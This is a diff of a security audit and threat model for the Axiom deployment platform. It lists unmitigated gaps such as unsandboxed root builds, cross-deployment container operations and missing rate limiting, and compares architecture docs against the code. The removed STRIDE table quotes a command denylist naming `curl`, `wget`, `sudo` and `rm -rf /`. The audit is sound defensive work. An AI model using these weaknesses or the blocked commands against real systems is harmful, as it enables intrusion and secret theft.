+- Containers are labelled and mutation-gated: `docker.go:549-562`.
+
+**State: PARTIEL.** No seccomp profile, no AppArmor profile, no capability
+dropping (`--cap-drop`), no read-only rootfs and no `no-new-privileges` are
+requested. Docker defaults apply. Listed as accepted V0.1 risk.
+
+### T28. Denial of service — orphan containers and unbounded reconciliation
+
+**Scenario.** The Engine restarts mid-operation; containers are left behind and
+never reconciled.
+
+**Controls.**
+- Durable operation state written on receipt and on completion:
+  `services/agent/internal/bootstrap/bootstrap.go:255-290`.
+- Local classification of interrupted work at boot: :177-181.
+- A reconciler exists and is reachable: `:181-188`, with `AllowCleanup: false`
+  so it can never remove anything.
+
+**State: NON CABLE.** `Reconcile` is never called at boot:
+`services/agent/internal/bootstrap/bootstrap.go:189-196` (the managed-deployment
+set is not exposed by any endpoint). It is also not called anywhere else in the
+module (grep for `Reconcile` outside tests returns only the definition and its
+comments). A restart therefore leaves orphans permanently.
+
+### T29. Information disclosure — the Agent has no TLS
+
+**Scenario.** An attacker on the network path between Engine and Agent reads
+the Agent credential in transit.
+
+**Controls.**
+- The Agent refuses every inbound operation regardless of transport, so nothing
+  sensitive is served today: `listener.go:47-52`, `:112-119`.
+- The listener binds loopback by default and refuses any routable address
+  without an explicit opt-in: `services/agent/internal/config/config.go:198-222`.
+- The Agent's own outbound policy requires https in production:
+  `config.go:184-193`, `services/agent/internal/security/transport/transport.go:71-91`.
+- The Engine requires https for agent endpoints in production and allows http
+  only on loopback otherwise:
+  `services/engine/internal/agentclient/client.go:542-557`.
+
+**State: ABSENT for TLS itself (tracked by #88).** The fail-closed stance makes
+it non-exploitable today; it becomes exploitable the moment T4's authenticator is
+implemented. See section 9.
+
+## 8. Threats: GitHub integration
+
+### T30. Spoofing — OAuth login CSRF and state replay
+
+**Scenario.** An attacker starts an OAuth flow, then lures the victim to the
+callback URL carrying the attacker's `code`, binding the attacker's GitHub
+account to the victim's Axiom session.
+
+**Controls.**
+- Browser secret cookie bound to the callback, `HttpOnly`, `SameSite=Lax`,
+  10-minute `MaxAge`: `api/github.go:44-47`, verified at `:59-62`.
+- State is single-use, 10-minute TTL, bound to the user:
+  `internal/github/auth/service.go:115`, `:156`.
+- PKCE S256 with the verifier sealed under a state-derived AAD:
+  `service.go:115`, `:156`.
+- Provider `error` parameter handled, `access_denied` mapped to a denied result:
+  `api/github.go:62-70`.
+- The callback never renders tokens and sets `Referrer-Policy: no-referrer`:
+  `api/github.go:72-75`.
+
+**State: EN PLACE.**
+
+### T31. Spoofing — webhook spoofing
+
+**Scenario.** A GitHub webhook is introduced; an attacker POSTs a forged
+`push` event to trigger a deployment of a chosen commit.
+
+**Controls.** None applicable. **There are no webhooks.** A repository-wide grep
+for `webhook` across `services/`, `schemas/` and the API contract returns 0
+occurrences. GitHub interaction is strictly user-initiated OAuth plus REST
+polling on demand (`api/api.go:137-142`).
+
+**State: ABSENT by design.** Recorded here because the moment webhooks land they
+must be signature-verified (`X-Hub-Signature-256`) and the delivery must be
+replay-bounded; otherwise the platform gains an unauthenticated write path into
+the deployment pipeline.
+
+## 9. Threats without an effective control — V0.1 gate list
+
+| # | Threat | State | Why it is not mitigated |
+|---|---|---|---|
+| G1 | **Unrestricted code execution in the build step** (T11) | PARTIEL | The repository Dockerfile is executed by a root Docker daemon with full network access and no resource or security limits (`internal/build/engine.go:228-236`, `internal/build/builder.go:74-81`). No rootless builder, no `--network=none`, no BuildKit sandbox, no instruction filtering. |
+| G2 | **Engine secrets inherited by the build process** (T10) | EN PLACE | Closed (E1). `cmd.Env = childEnv(os.Environ(), b.Env)` is now unconditional (`services/engine/internal/build/builder.go:156-158`); `childEnv` (`:88-117`) keeps only the `buildEnvNames` allowlist (`:55-72`) plus caller-requested `ExecBuilder.Env` and a `defaultPATH` fallback (`:52-53`), so `docker build` can no longer see `AXIOM_SECRET_KEY`, `DATABASE_URL`, `AXIOM_API_TOKEN` or `AXIOM_GITHUB_CLIENT_SECRET`, whether `bootstrap.go:250` leaves `Env` nil or not. Regression tests `builder_test.go:120`, `:142`, `:174`. |
+| G3 | **Cross-deployment container operations** (T6) | PARTIEL | `ownership.assertScope` (`ownership.go:139-150`) is strict, but START, STOP and REMOVE go through `docker.go:553-562`, which checks only `IsManaged` and never compares a label to the operation scope. A STOP or REMOVE for deployment D1 accepts a container belonging to D2. CREATE_RUNTIME and NETWORK do enforce the full scope. |
+| G4 | **Cross-tenant server enumeration** (T7) | ABSENT | `api/handlers.go:136-160`, `:162-181`, `:265-273` have no owner predicate; `internal/database/repositories.go:236-241` selects on status only. |
+| G5 | **No API rate limiting or account lockout** (T19, T20) | ABSENT | No rate-limit middleware exists in `services/engine/internal/api`. `POST /api/v1/auth/register` and `/auth/login` are public (`api/middleware.go:154-160`) and unbounded. The agent `RateLimiter` (`transport.go:117-159`) has zero non-test callers. |
+| G6 | **No TLS on the Agent listener** (T29) | ABSENT | No implementation (#88). Currently masked by `refuseInbound`; becomes live the moment an inbound authenticator is injected. |
+| G7 | **No Engine-to-Agent credential** (T5) | ABSENT | `bootstrap.go:255-258` injects `unavailableCredential`, which always returns `ErrNoCredential` (`:292-296`). Every deployment reaching `CREATE_RUNTIME` fails with `AGENT_NO_CREDENTIAL`. No deployment can reach LIVE. |
+| G8 | **Command denylist is bypassable** (T13) | PARTIEL | `internal/profile/presets/presets.go:197-213` is a blocklist; `;`, `|`, `&`, `>`, `eval`, `apt-get`, `python -c` are not blocked. |
+| G9 | **Unpinned base images and no dependency scanning** (T15, T16) | ABSENT | Floating tags `node:20-alpine`, `nginx:1.27-alpine`, `golang:1.23-alpine`; no `govulncheck`, `npm audit` or image scan in CI. |
+| G10 | **Container isolation is Docker-default** (T27) | PARTIEL | No seccomp, AppArmor, `--cap-drop`, read-only rootfs or `no-new-privileges`. |
+| G11 | **Reconciliation never runs** (T28) | NON CABLE | `services/agent/internal/bootstrap/bootstrap.go:189-196`: no boot call, no endpoint exposing the managed set. Orphans are permanent. |
+| G12 | **PBKDF2 below current guidance** (T19) | PARTIEL | 200 000 iterations, self-labelled interim (`internal/auth/password.go:15-23`). |
+
+Recommended V0.1 disposition: G2 is closed (E1, resolved during the audit). G3,
+G4 and G5 are code defects on the authenticated API and runtime paths and
+should be closed before the release gate. G1 is inherent to the product's
+purpose and must be closed by an operational decision (documented build
+isolation) plus an explicit accepted-risk sign-off, not by a claim of
+mitigation. G6 and G7 are already covered by a fail-closed posture and are not
+exploitable in V0.1.
+
+## 10. Verification record
+
+Verified against commit `427b630` on branch `main`, **plus the uncommitted
+working-tree changes present at the time of writing** (19 files, +1526/-437,
+implementing issue #145: mandatory `applicationId` on the agent protocol and a
+strict `ownership.Scope`). `go build ./...` succeeds in `services/engine`. Every
+`path:line` above was read in that state. Claims about instantiation were checked
+against the composition roots `services/engine/internal/bootstrap/bootstrap.go`
+and `services/agent/internal/bootstrap/bootstrap.go`, not against package
+presence.
+
+Because the working tree was being modified concurrently with this audit, line
+numbers in the sections below were re-derived after the #145 changes landed. A
+rebase onto the final commit may still shift them.
+
+Known non-instantiated code paths found during this audit, listed so that a
+future reader does not mistake them for controls:
+
+- `services/engine/internal/agentclient/client.go` — `CredentialProvider` seam,
+  no production implementation (`bootstrap.go:255-258`).
+- `services/agent/internal/security/transport/transport.go:117-159` —
+  `RateLimiter`, no caller.
+- `services/agent/internal/recovery` `Reconciler` — constructed
+  (`bootstrap.go:182-189`), never run.
+- `services/agent/internal/logs` `Fetcher` — constructed
+  (`bootstrap.go:208`), never invoked; no Engine endpoint consumes it.
+- `services/agent/internal/metrics` — no HTTP endpoint.
+- `services/engine/internal/secrets.Service.Resolve` — the runtime injection
+  path for application configuration values has no caller outside tests, so
+  stored configuration values are not yet delivered to a container.
+
+## 11. Discrepancies found during the audit
+
+The verbatim report is reproduced in the next section.
+
+## Ecarts constatés (section 11, verbatim)
+
+### E1. RESOLVED DURING THE AUDIT — the builder now gets an explicit minimal environment and `docs/architecture/deployment-policy.md:40` matches the code.
+
+Both sides of the divergence are closed. The code now always sets an explicit
+child environment: `cmd.Env = childEnv(os.Environ(), b.Env)` at
+`services/engine/internal/build/builder.go:156-158`. `childEnv` (`:88-117`)
+copies only the `buildEnvNames` allowlist (`:55-72`) from the parent, adds
+caller-requested `ExecBuilder.Env` on top with override on key collision, and
+falls back to `defaultPATH` (`:52-53`) when PATH is absent.
+`docs/architecture/deployment-policy.md:40` now documents exactly that
+behaviour. Non-regression tests: `TestExecBuilderNilEnvDoesNotInheritEngineEnvironment`,
+`TestExecBuilderExplicitEnvIsCallerRequestedOnly` and `TestChildEnv`
+(`services/engine/internal/build/builder_test.go:120`, `:142`, `:174`). T10 and
+G2 are now EN PLACE.
+
+The original write-up is kept below as the historical justification. The
+quotation is `deployment-policy.md:40` as it read at audit time (since
+reworded), and the `if b.Env != nil` branch it quotes is gone from `builder.go`:
+
+The document states:
+
+> Builds run in ephemeral 0700 workspaces with extracted (not executed)
+> sources; builder child processes get an explicit minimal environment (#98).
+
+The workspace half is true (`services/engine/internal/build/workspace/workspace.go:78`,
+`0o700`). The environment half is false.
+`services/engine/internal/bootstrap/bootstrap.go:250` constructs
+`&build.ExecBuilder{Docker: cfg.Docker.Binary}` and never sets `Env`, so
+`ExecBuilder.Env` is nil. At
+`services/engine/internal/build/builder.go:85-87`:
+
+```go
+if b.Env != nil {
+    cmd.Env = b.Env
+}
 ```
 
-### 3.1 Boundary descriptions
+With a nil `Env`, `exec.Cmd` inherits `os.Environ()`, so the `docker build`
+child runs with `AXIOM_SECRET_KEY`, `DATABASE_URL`, `AXIOM_API_TOKEN` and
+`AXIOM_GITHUB_CLIENT_SECRET` in its environment. The code comment at
+`builder.go:42-45` documents this as intentional when nil; the composition root
+is what leaves it nil. Any local process able to read `/proc/<pid>/environ` for
+the builder (the Engine runs as root, so any local user on a multi-tenant host)
+recovers the platform's master encryption key. This is G2.
 
-| Boundary | Trust relationship | Mechanism |
-|---|---|---|
-| API client → Engine | User is authenticated, resources are scoped | Bearer token (`AXIOM_API_TOKEN`), application-scoped ownership checks (404 for foreign resources) |
-| Engine → GitHub | Engine presents user's sealed OAuth token | AES-256-GCM sealed tokens, PKCE S256, single-use state bound to browser |
-| Engine → Agent | Engine authorizes every operation; agent re-validates | Closed operation set, deterministic operation IDs, server identity binding |
-| Agent → Docker/Traefik | Agent has server-local root access | Agent runs on the server; no remote shell |
-| Repository → Engine | Repository code is never executed during analysis | Read-only snapshot, no symlinks, path traversal rejection |
-| Repository → Build | Build runs in ephemeral 0700 workspace | Extracted (not executed) sources, minimal environment for builder |
+### E2. `docs/architecture/secret-handling.md:62-63` claims the executor resolves configuration names into the build env. It does not.
 
-## 4. STRIDE threat analysis
+The document states, as an integration point:
 
-### 4.1 Public API surface
+> Build env (#83) | `executor` resolves `plan.Runtime.Configuration` names via
+> `appconfig.Service.Resolve` and passes env at `build.Input` construction time
 
-| Threat | STRIDE | Description | Mitigation | Status |
-|---|---|---|---|---|
-| Unauthorized API access | Spoofing | Attacker sends requests without valid bearer token | `TokenAuthenticator` with constant-time SHA-256 comparison; `denyAll` fail-closed when no authenticator configured | Implemented (`internal/api/middleware.go`) |
-| Token replay | Repudiation | Attacker replays a captured bearer token | Interim static token (#125 will replace with user sessions); token never logged | Implemented (interim) |
-| Cross-tenant access | Tampering | Attacker accesses another user's applications/deployments | `ownedApplication` / `loadDeployment` return 404 for foreign resources (no existence leak) | Implemented (`internal/api/handlers.go`) |
-| Request body abuse | Tampering | Attacker sends oversized or malformed JSON | 1 MiB body limit, strict JSON decoding, unknown field rejection | Implemented (`internal/api/http.go`) |
-| Secret leakage in errors | Information disclosure | Attacker extracts internal details from error messages | 5xx errors return stable `INTERNAL_ERROR`; server-side detail logged with redaction | Implemented (`internal/api/http.go`, `internal/api/errors.go`) |
-| Secret leakage in logs | Information disclosure | Attacker reads logs containing tokens or passwords | `logs.Redact` before persistence; `[REDACTED]` marker; PEM, URL creds, bearer, JSON/KV secrets | Implemented (`internal/logs/redact.go`) |
-| Log secret leakage (5xx) | Information disclosure | Internal error details leaked in 5xx responses | 5xx messages replaced with stable text; detail logged redacted | Implemented (`internal/api/http.go`) |
-| Idempotency key abuse | Tampering | Attacker reuses an idempotency key with different request | `Idempotency-Key` scoped per actor+operation+application; hash mismatch → 409 CONFLICT | Implemented (`internal/deployment/store.go`) |
-| Rate limiting bypass | Denial of service | Attacker floods the API | GitHub rate limits normalized to 429; no general API rate limiter in V0.1 | TODO(#129) — general API rate limiting not yet implemented |
-| SSE stream hijacking | Tampering | Attacker subscribes to another user's deployment events | `ownedDeployment` wrapper enforces application ownership before streaming | Implemented (`internal/api/handlers.go`) |
-| SSE event injection | Tampering | Attacker injects fake events into the stream | Events are persisted in PostgreSQL; bus is only a notifier; gaps repaired from store | Implemented (`internal/api/sse/sse.go`) |
+and at `:64-65`:
 
-### 4.2 GitHub callback surface
+> Runtime env | `CreateRuntimeRequest` carries resolved env entries to the agent
+> (protocol §6 payload)
 
-| Threat | STRIDE | Description | Mitigation | Status |
-|---|---|---|---|---|
-| OAuth state replay | Repudiation | Attacker replays a captured `state` parameter | State is single-use (consumed atomically), expires after 10 minutes, bound to user and browser | Implemented (`internal/github/auth/service.go`) |
-| Login CSRF | Spoofing | Attacker starts OAuth flow in victim's browser | Browser secret cookie (`axiom_github_oauth`, HttpOnly, SameSite=Lax, 10-min MaxAge) bound to callback | Implemented (`internal/api/github.go`) |
-| PKCE bypass | Tampering | Attacker intercepts authorization code | PKCE S256 challenge; verifier sealed with state-bound AAD | Implemented (`internal/github/auth/service.go`) |
-| Token leakage | Information disclosure | Attacker reads GitHub tokens from API responses | Tokens never returned by any endpoint; stored AES-256-GCM sealed; never logged | Implemented (`internal/github/auth/service.go`) |
-| Token swap | Tampering | Attacker swaps ciphertext between connections | Ciphertext bound to connection ID as AAD (`github-access:<id>`) | Implemented (`internal/security/secrets/box.go`) |
-| Provider error injection | Tampering | Attacker sends fake `error` parameter | `error` query parameter handled; `access_denied` → user-facing denied result | Implemented (`internal/api/github.go`) |
+Neither is true.
+`services/engine/internal/executor/model.go:36-41` declares
+`CreateRuntimeRequest` with exactly `Operation`, `ImageRef`, `Container` and
+`Port` — there is no `Env` field. `services/engine/internal/agentclient/client.go:225-234`
+declares the wire `payload` with `ImageRef`, `Container`, `Port`, `Proxy`,
+`Domain`, `TLS`, `Path` and `TimeoutSeconds` — no env. A grep for
+`appconfig.Service.Resolve` / `.Resolve(` outside tests returns only the
+definition at `services/engine/internal/secrets/appconfig.go:80` and the
+unrelated `authz.Resolve` calls. Meanwhile the agent's Docker adapter supports
+env explicitly (`services/agent/internal/runtime/docker/docker.go:201-205` and
+`:327-329`) and the Engine never populates it. Consequence: an application can
+store a configuration value through `PUT /api/v1/applications/{id}/configuration/{name}`,
+it is sealed at rest, it is listed as `isSet` in the API, and it is then never
+delivered to the running container. A deployment relying on a stored secret will
+start with the variable unset.
 
-### 4.3 Agent endpoints surface
+### E3. RESOLVED DURING THE AUDIT — the Engine/agent wire contract gap is now closed, but two consequences were not re-verified here.
 
-| Threat | STRIDE | Description | Mitigation | Status |
-|---|---|---|---|---|
-| Rogue agent registration | Spoofing | Attacker registers a fake agent for a server | Single-use bootstrap token (15-min TTL, bound to pending server, single redeem) | Implemented (`internal/agentauth/service.go`) |
-| Agent credential replay | Repudiation | Attacker replays a captured agent credential | Nonce + timestamp freshness (5-min skew, 10-min nonce window); credentials stored as SHA-256 hashes | Implemented (`internal/agentauth/service.go`) |
-| Agent credential theft | Information disclosure | Attacker reads plaintext credentials from storage | Credentials stored only as SHA-256 hashes; plaintext returned exactly once at issue/redeem | Implemented (`internal/agentauth/service.go`) |
-| Operation injection | Tampering | Attacker sends forged operations to the agent | Closed operation set; unknown types rejected with `UNKNOWN_OPERATION`; server identity binding | Implemented (`services/agent/internal/protocol/protocol.go`) |
-| Operation replay | Repudiation | Attacker replays a captured operation | Deterministic operation IDs (`op_<deploymentID>_<STEP>_<attempt>`); agent-side dedupe window | Implemented (`services/agent/internal/protocol/protocol.go`) |
-| Server identity spoofing | Spoofing | Attacker binds agent to a different server | Bootstrap token bound to server; operation `serverId` must match agent's bound server | Implemented (`internal/agentauth/service.go`, `services/agent/internal/protocol/protocol.go`) |
-| Agent impersonation | Spoofing | Attacker uses a stolen agent credential | Credential rotation with 5-min grace; revocation on server revocation; 90-day TTL | Implemented (`internal/agentauth/service.go`) |
-| Transport eavesdropping | Information disclosure | Attacker reads agent ↔ Engine traffic | HTTPS transport; credential in `Authorization` header (not URL) | Implemented (HTTPS); mTLS TODO(#88) |
-| Agent denial of service | Denial of service | Attacker floods agent endpoints | Agent endpoints bypass user authenticator but require valid agent credentials | Implemented; rate limiting TODO(#129) |
+At the moment this audit began, the Engine's `agentclient.operation` struct had
+no `ApplicationID` field while
+`services/agent/internal/protocol/protocol.go:224-229` made `applicationId`
+mandatory on every operation (`ErrIncompleteScope`). Every message the Engine
+could build would therefore have been refused by the agent.
 
-### 4.4 Build pipeline surface
+Uncommitted working-tree changes implementing issue #145 closed this: the wire
+struct now carries `ApplicationID` (`client.go:271-273`), the value is resolved
+from the deployment record rather than defaulted (`client.go:548-559`, refusing
+with `CodeNoApplication` when the deployment names no application) and stamped
+onto every operation (`client.go:464-475`).
 
-| Threat | STRIDE | Description | Mitigation | Status |
-|---|---|---|---|---|
-| Build command injection | Tampering | Attacker injects shell commands via `build.command` or `startCommand` | `presets.ValidateCommand`: single line, printable ASCII ≤ 500 chars; rejects `` ` ``, `$(`, `<<`, `sudo `, `rm -rf /`, `curl `, `wget ` | Implemented (`internal/profile/presets/presets.go`) |
-| Dockerfile injection | Tampering | Attacker adds malicious Dockerfile commands | Dockerfile is repository content; build runs in ephemeral workspace with minimal environment; no secrets in build context | Implemented (`internal/build/builder.go`, `internal/build/workspace/workspace.go`) |
-| Source archive traversal | Tampering | Attacker includes `../` paths in tarball | `workspace.cleanPath` and `snapshot.normalize` reject absolute paths, `..` traversal, backslashes, null bytes | Implemented (`internal/build/workspace/workspace.go`, `internal/analyzer/snapshot/snapshot.go`) |
-| Symlink attack | Tampering | Attacker includes symlinks to escape workspace | Symlinks, hardlinks, devices are skipped (recorded in `Skipped`, never followed) | Implemented (`internal/build/workspace/workspace.go`, `internal/analyzer/snapshot/snapshot.go`) |
-| Large file DoS | Denial of service | Attacker includes huge files in repository | Limits: 200 MiB compressed, 1 GiB total, 50 000 files, 100 MiB per file (workspace); 512 KiB retained per file, 64 MiB retained total (snapshot) | Implemented (`internal/build/workspace/workspace.go`, `internal/analyzer/snapshot/snapshot.go`) |
-| Secret leakage via snapshot | Information disclosure | Attacker reads secrets from repository files | `secretLike` files (`.env`, `.npmrc`, `.netrc`, `.pypirc`, `*.pem`, `*.key`, `id_rsa*`, `id_ed25519*`) are never retained in snapshot content | Implemented (`internal/analyzer/snapshot/snapshot.go`) |
-| Build workspace escape | Tampering | Attacker accesses host filesystem from build | Workspace is 0700, ephemeral, unique per build; builder gets explicit minimal environment; no control-plane credentials in workspace | Implemented (`internal/build/workspace/workspace.go`, `internal/build/builder.go`) |
-| Image tag injection | Tampering | Attacker injects malicious image tags | Image tags are Engine-generated (`<registry>/<slug>:<commit7>-<dep8>`); slug sanitized to lowercase alphanumeric + hyphens | Implemented (`internal/build/engine.go`) |
-| Registry poisoning | Tampering | Attacker pushes malicious images to registry | Images are built by the Engine from source; registry is `axiom-local` (local Docker); no external registry in V0.1 | Implemented (local registry); external registry trust TODO(#129) |
+Two consequences are noted rather than claimed as verified, because they landed
+after the corresponding code paths were read:
 
-### 4.5 Snapshot / analysis surface
+- The Engine now performs an application lookup per operation
+  (`client.go:548`). That is a new dependency on an application store inside the
+  dispatch path; its failure mode is a refused operation, which is fail-closed.
+- G3 below was re-checked after the change and still holds: the stricter scope
+  assertion is not used by the Docker `Start`/`Stop`/`Remove` path.
 
-| Threat | STRIDE | Description | Mitigation | Status |
-|---|---|---|---|---|
-| Repository code execution | Tampering | Attacker includes malicious code that runs during analysis | Analysis never executes repository code; snapshot is read-only metadata + bounded file content | Implemented (`internal/analyzer/snapshot/snapshot.go`) |
-| Binary file DoS | Denial of service | Attacker includes binary files that crash the analyzer | Binary detection (null byte or invalid UTF-8 in head); binary files not retained | Implemented (`internal/analyzer/snapshot/snapshot.go`) |
-| Duplicate entry abuse | Tampering | Attacker includes duplicate paths in tarball | Duplicate entries rejected as `ErrMalformed` | Implemented (`internal/analyzer/snapshot/snapshot.go`) |
-| Empty archive abuse | Denial of service | Attacker submits empty archive | Empty archives rejected with `ErrEmpty` | Implemented (`internal/analyzer/snapshot/snapshot.go`) |
-| Archive bomb | Denial of service | Attacker includes highly compressed archive that expands hugely | Compressed byte limit (200 MiB) enforced during read; uncompressed total limit (1 GiB) | Implemented (`internal/analyzer/snapshot/snapshot.go`) |
-| Analysis timeout abuse | Denial of service | Attacker triggers long-running analysis | 2-minute analysis timeout | Implemented (`internal/analysis/service.go`) |
+### E4. RESOLVED DURING THE AUDIT — Traefik ownership is now deployment-scoped.
 
-### 4.6 Docker / Traefik on server surface
+Recorded because the earlier state was weaker and the composition-root comment
+was misleading. `ownership.Scope`
+(`services/agent/internal/security/ownership/ownership.go:139-150`) now compares
+both `axiom.application` and `axiom.deployment` against the operation scope, and
+the Traefik adapter passes it (`traefik.go:269-273`). The earlier concern that
+routing was gated only on `IsManaged` no longer applies.
 
-| Threat | STRIDE | Description | Mitigation | Status |
-|---|---|---|---|---|
-| Container escape | Tampering | Attacked application escapes container | Docker container isolation; no privileged mode in V0.1; TODO(#129) — seccomp/AppArmor profiles not yet enforced |
-| Port conflict abuse | Denial of service | Attacker deploys app on conflicting port | Host port mapping is agent-managed; conflicts surface as `RUNTIME_FAILED` | Implemented (detection); prevention TODO(#129) |
-| Traefik config injection | Tampering | Attacker modifies Traefik routing | Traefik configured only by agent's network adapter; Engine stores routing intent, agent applies it | Implemented (agent-scoped); unrestricted Traefik config forbidden (API contract §22) |
-| Certificate private key theft | Information disclosure | Attacker reads Let's Encrypt private keys | Keys managed by Traefik on server; Engine never handles certificates | Implemented (agent-scoped) |
-| DNS hijacking | Tampering | Attacker changes DNS to point domain elsewhere | `CheckDNS` verifies resolution matches server address; mismatch reported | Implemented (`internal/domains/verify.go`) |
-| Domain/hostname abuse | Tampering | Attacker registers hostname for another application | Hostnames globally unique; `EnsureDomain` rejects unregistered hostnames for planning; ownership verified per application | Implemented (`internal/domains/domains.go`) |
-| SSRF via repository URLs | Tampering | Attacker provides repository URL pointing to internal services | Repository URLs come from GitHub API (trusted source); archive fetched from GitHub codeload; no arbitrary URL fetching | Implemented (GitHub-only); SSRF via health paths TODO(#129) |
-| SSRF via health check paths | Tampering | Attacker sets health path to internal URL | Health path is validated to start with `/`; probe is executed by agent against the deployed application, not arbitrary URLs | Implemented (path validation); full SSRF test TODO(#129) |
+### E5. `docs/architecture/boundaries.md:71` says the build "runs in isolated workspace (#98)". The workspace is isolated on disk; the build itself is not sandboxed.
 
-### 4.7 Secrets surface
+The boundary table row reads:
 
-| Threat | STRIDE | Description | Mitigation | Status |
-|---|---|---|---|---|
-| GitHub token theft at rest | Information disclosure | Attacker reads tokens from database | AES-256-GCM sealed with `AXIOM_SECRET_KEY`; bound to connection ID as AAD | Implemented (`internal/security/secrets/box.go`) |
-| GitHub token theft in transit | Information disclosure | Attacker reads tokens from logs or API responses | Tokens never logged; never returned by API; `AccessToken` is the only export path | Implemented (`internal/github/auth/service.go`) |
-| Agent credential theft | Information disclosure | Attacker reads agent credentials from database | Stored as SHA-256 hashes; plaintext returned once; rotation with grace | Implemented (`internal/agentauth/service.go`) |
-| API token theft | Information disclosure | Attacker reads `AXIOM_API_TOKEN` from logs | Token never logged; validated at startup; required in production | Implemented (`internal/config/config.go`) |
-| Database credential theft | Information disclosure | Attacker reads `DATABASE_URL` from logs | Never logged; validated at startup | Implemented (`internal/config/config.go`) |
-| Secret values in plans | Information disclosure | Attacker embeds secrets in deployment plan | `policy.scanSecrets` rejects plans matching password/token/bearer/private-key patterns | Implemented (`internal/policy/policy.go`) |
-| Secret values in logs | Information disclosure | Attacker reads secrets from deployment logs | `logs.Redact` runs before persistence; PEM, URL creds, bearer, JSON/KV secrets replaced with `[REDACTED]` | Implemented (`internal/logs/redact.go`) |
-| Secret values in events | Information disclosure | Attacker reads secrets from SSE events | Event payloads must remain free of secrets (API contract §23); health body truncated to 4096 bytes | Implemented (API contract §23, `internal/health/health.go`) |
-| Secret values in error messages | Information disclosure | Attacker reads secrets from 5xx error details | 5xx messages replaced with stable `INTERNAL_ERROR`; detail logged redacted | Implemented (`internal/api/http.go`) |
+> B6 | Repository code is never executed during analysis | analyzer reads files
+> only; build runs in isolated workspace (#98)
 
-## 5. Accepted risks
+The analysis half is true. The build half describes directory placement, not
+execution isolation: `internal/build/engine.go:228-236` passes the repository
+Dockerfile to the builder unchanged and `internal/build/builder.go:74-81` issues
+`docker build` with no `--network=none`, no `--security-opt`, no resource
+limits and no rootless builder. The workspace constrains where files land, not
+what the builder may do. This is G1 and the wording should not be read as
+claiming build isolation.
 
-| Risk | Rationale | Mitigation plan |
-|---|---|---|
-| No general API rate limiting | V0.1 has a single static API token; rate limiting is a platform concern | TODO(#129) — implement per-token or per-IP rate limiting |
-| No mTLS for agent transport | Transport hardening tracked by #88 | TODO(#88) — add mTLS or request signing |
-| No seccomp/AppArmor for containers | V0.1 relies on Docker default isolation | TODO(#129) — enforce seccomp/AppArmor profiles |
-| No external registry trust policy | V0.1 uses local Docker registry only | TODO(#129) — define image trust policy for external registries |
-| Agent runs as root on server | Agent needs Docker and Traefik access | TODO(#129) — run agent with least privilege |
-| Analysis has 2-minute timeout | Prevents infinite analysis but may fail on huge repositories | Monitor and tune |
-| Build has 20-minute timeout | Prevents infinite builds but may fail on huge contexts | Monitor and tune |
+### E6. `docs/architecture/secret-handling.md:26` and the package comments present the application configuration store as a working secret boundary; the values are write-only and unreachable.
 
-## 6. Abuse test coverage
+`services/engine/internal/secrets/appconfig.go:3-5` describes the service as
+resolving values "into runtime environment entries at the injection boundary",
+and `internal/security/secrets/store.go:20-23` states that `Get` is for
+"components authorized to consume the value (the GitHub API client, the
+build/runtime injection boundary)". The build/runtime injection consumer does not
+exist (E2). `List` reports `Secret: true, IsSet: true` for every entry
+(`appconfig.go:67`), so the API reports a usable configuration that no runtime
+path consumes. Not a vulnerability, but it is a correctness gap that reads as a
+security control and is not one.
 
-| Surface | Test | Status |
-|---|---|---|
-| Public API | Authentication required for all `/api/v1` endpoints | Implemented (`internal/api/middleware.go`) |
-| Public API | Foreign resources return 404 (no existence leak) | Implemented (`internal/api/handlers.go`) |
-| Public API | Request body size limit (1 MiB) | Implemented (`internal/api/http.go`) |
-| Public API | Unknown fields rejected | Implemented (`internal/api/http.go`) |
-| GitHub callback | Single-use state | Implemented (`internal/github/auth/service.go`) |
-| GitHub callback | Browser cookie binding | Implemented (`internal/api/github.go`) |
-| Agent endpoints | Bootstrap token single-use | Implemented (`internal/agentauth/service.go`) |
-| Agent endpoints | Credential replay protection | Implemented (`internal/agentauth/service.go`) |
-| Agent endpoints | Server identity binding | Implemented (`services/agent/internal/protocol/protocol.go`) |
-| Build pipeline | Command injection rejected | Implemented (`internal/profile/presets/presets.go`) |
-| Build pipeline | Path traversal rejected | Implemented (`internal/build/workspace/workspace.go`) |
-| Build pipeline | Symlinks skipped | Implemented (`internal/build/workspace/workspace.go`) |
-| Build pipeline | Size limits enforced | Implemented (`internal/build/workspace/workspace.go`) |
-| Snapshot | Secret-like files not retained | Implemented (`internal/analyzer/snapshot/snapshot.go`) |
-| Snapshot | Binary files not retained | Implemented (`internal/analyzer/snapshot/snapshot.go`) |
-| Secrets | Tokens sealed at rest | Implemented (`internal/security/secrets/box.go`) |
-| Secrets | Logs redacted before persistence | Implemented (`internal/logs/redact.go`) |
-| Secrets | Plans with secrets rejected | Implemented (`internal/policy/policy.go`) |
-| SSRF | Repository URLs from GitHub only | Implemented (GitHub adapter) |
-| SSRF | Health paths validated | Implemented (`internal/planner/validation/validation.go`) |
-| Domain abuse | Hostnames globally unique | Implemented (`internal/domains/domains.go`) |
-| Domain abuse | Unregistered hostnames rejected for planning | Implemented (`internal/domains/domains.go`) |
+### E7. `services/agent/internal/runtime/docker/docker.go:549-551` still documents `verifyManaged` as if it enforced the ownership scope, but it enforces only managed-ness.
 
-## 7. TODOs
+The comment reads:
 
-| Issue | Description |
-|---|---|
-| #88 | Transport hardening (mTLS, request signing) for agent ↔ Engine |
-| #89 | Agent authorization (re-validate authorization before execution) |
-| #129 | Finalize this threat model after #88/#89; add general API rate limiting; add container isolation profiles; add external registry trust policy; add SSRF abuse tests |
+> verifyManaged enforces the ownership boundary for every mutation: the container
+> must exist AND is Axiom-managed (ownership.IsManaged). Anything else is refused
+> (ErrNotManaged or not-found) and never touched.
 
-## 8. Related documentation
+The first sentence is accurate as written, but it sits directly above the
+`Start`, `Stop` and `Remove` path and invites the reading that the same
+application+deployment scope enforced by `ownership.assertScope`
+(`ownership.go:139-150`) applies here. It does not: `verifyManaged` returns
+success for any Axiom-managed container regardless of scope, so those three
+operations cross deployment boundaries on the same server. This is G3, and the
+docstring is the reason a reader would not notice.
 
-- `docs/architecture/api-contract.md` — API contract, security boundary (§22)
-- `docs/architecture/deployment-policy.md` — Deployment security boundary, gates, policy rules
-- `docs/architecture/agent-protocol.md` — Agent ↔ Engine protocol, security mapping (§10)
-- `docs/adr/0005-traefik-reverse-proxy.md` — Traefik as reverse proxy with ACME
-- `docs/operations/runbook.md` — Operational failure matrix and runbook
+`services/agent/internal/bootstrap/bootstrap.go:161-164` compounds it by
+stating that "the Docker adapter enforces the same boundary internally", which
+was true before #145 and is no longer true.
+
